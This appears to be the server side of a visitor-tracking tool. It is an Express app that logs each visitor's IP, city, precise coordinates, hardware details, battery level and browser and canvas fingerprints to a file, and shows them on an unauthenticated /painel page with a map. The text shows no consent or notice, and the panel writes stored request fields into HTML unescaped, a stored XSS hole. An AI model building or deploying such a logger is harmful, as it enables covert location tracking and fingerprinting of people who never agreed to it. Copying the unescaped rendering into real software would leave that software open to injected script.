// server.js atualizado com geoip-lite + ua-parser-js + suporte aos novos dados do script.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const app = express();
const PORT = 3000;
const ARQUIVO = path.join(__dirname, 'localizacoes.txt');

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/localizacao', (req, res) => {
  const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const ip = ipRaw.includes(',') ? ipRaw.split(',')[0] : ipRaw;

  const geo = geoip.lookup(ip) || {};

  const userAgentRaw = req.headers['user-agent'];
  const parser = new UAParser(userAgentRaw);
  const parsedUA = parser.getResult();
  const navegador = `${parsedUA.browser.name || 'Desconhecido'} ${parsedUA.browser.version || ''}`;
  const sistema = `${parsedUA.os.name || ''} ${parsedUA.os.version || ''}`;
  const referer = req.headers.referer || 'Referer vazio';

  const dados = {
    ...req.body,
    ip,
    cidade: geo.city || 'Desconhecida',
    estado: geo.region || 'Desconhecido',
    pais: geo.country || 'Desconhecido',
    referer,
    navegador,
    sistema,
    bot: req.body.webdriver || false
  };

  fs.appendFileSync(ARQUIVO, JSON.stringify(dados) + '\n');
  console.log('📦 Dados recebidos:', dados);
  res.status(200).json({ status: 'ok' });
});

app.get('/painel', (req, res) => {
  let html = `
    <html>
    <head>
      <title>Painel de Acessos</title>
      <style>
        body { font-family: Arial, sans-serif; background: #1e1e2f; color: #eee; padding: 30px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #444; padding: 8px; text-align: left; font-size: 13px; }
        th { background: #00d8ff; color: black; }
        tr:nth-child(even) { background: #2c2c3f; }
        tr:hover { background: #444; }
        h1 { text-align: center; color: #00d8ff; }
      </style>
    </head>
    <body>
      <h1>Painel de Acessos</h1>
      <table>
        <tr>
          <th>Data</th><th>IP</th><th>Cidade</th><th>Estado</th><th>País</th><th>Plataforma</th><th>Navegador</th><th>Referer</th><th>Bot?</th><th>Latitude</th><th>Longitude</th><th>Precisão</th>
          <th>RAM</th><th>CPU</th><th>Resolução</th><th>Pixel Ratio</th><th>Fingerprint</th><th>Conexão</th><th>Bateria</th><th>Modo Escuro</th><th>Idioma</th><th>Canvas FP</th><th>Ação</th>
        </tr>`;

  if (fs.existsSync(ARQUIVO)) {
    const linhas = fs.readFileSync(ARQUIVO, 'utf-8').split('\n').filter(Boolean);
    linhas.reverse().forEach(linha => {
      const l = JSON.parse(linha);
      html += `
        <tr>
          <td>${l.dataHora || ''}</td>
          <td>${l.ip || ''}</td>
          <td>${l.cidade || ''}</td>
          <td>${l.estado || ''}</td>
          <td>${l.pais || ''}</td>
          <td>${l.sistema || l.platform || ''}</td>
          <td>${l.navegador || ''}</td>
          <td>${l.referer || ''}</td>
          <td>${l.bot ? 'Sim' : 'Não'}</td>
          <td>${l.latitude || ''}</td>
          <td>${l.longitude || ''}</td>
          <td>${l.accuracy || ''}</td>
          <td>${l.deviceMemory || ''} GB</td>
          <td>${l.cpuCores || ''}</td>
          <td>${l.screenResolution || ''}</td>
          <td>${l.pixelRatio || ''}</td>
          <td>${l.fingerprint ? l.fingerprint.slice(0, 10) : ''}</td>
          <td>${l.connection?.effectiveType || ''}</td>
          <td>${l.battery?.level != null ? Math.round(l.battery.level * 100) + '%' : ''}</td>
          <td>${l.prefersDarkMode ? 'Sim' : 'Não'}</td>
          <td>${l.language || ''}</td>
          <td>${l.canvasFingerprint ? l.canvasFingerprint.slice(22, 42) : ''}</td><td><button onclick="abrirModal('${encodeURIComponent(JSON.stringify(l).replace(/'/g, '&#39;'))}')">📍 Dados Inteligentes</button></td>
        </tr>`;
    });
  }

  html += `</table>

<script src='https://unpkg.com/leaflet@1.9.3/dist/leaflet.js'></script>
<link rel='stylesheet' href='https://unpkg.com/leaflet@1.9.3/dist/leaflet.css'/>
<script>
  function abrirModal(dados) {
    const info = JSON.parse(decodeURIComponent(dados));
    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.background = 'rgba(0,0,0,0.85)';
    container.style.zIndex = '9999';
    const content = '<div style=\'position:absolute;top:5%;left:5%;width:90%;height:90%;background:#fff;color:#000;padding:20px;overflow:auto;border-radius:8px;\'>
' +
      '<h2 style=\'margin-top:0;\'>📍 Dados Inteligentes</h2>' +
      '<div id=\'map\' style=\'height:300px;border-radius:6px;\'></div>' +
      '<pre id=\'jsonData\' style=\'background:#f1f1f1;padding:10px;margin-top:20px;border-radius:6px;font-size:12px;\'></pre>' +
      '<button onclick=\'this.parentNode.parentNode.remove()\' style=\'margin-top:10px;padding:10px 20px;background:#00d8ff;border:none;border-radius:5px;\'>Fechar</button>' +
      '</div>';
    container.innerHTML = content;
    container.querySelector('#jsonData').innerHTML = JSON.stringify(info, null, 2).replace(/[<>&]/g, c => ({'<':'&lt;', '>':'&gt;', '&':'&amp;'})[c]);
    document.body.appendChild(container);

    const map = L.map('map').setView([info.latitude, info.longitude], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19
    }).addTo(map);
    L.marker([info.latitude, info.longitude]).addTo(map);
  }
</script>
</body></html>`;
  res.send(html);
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
});
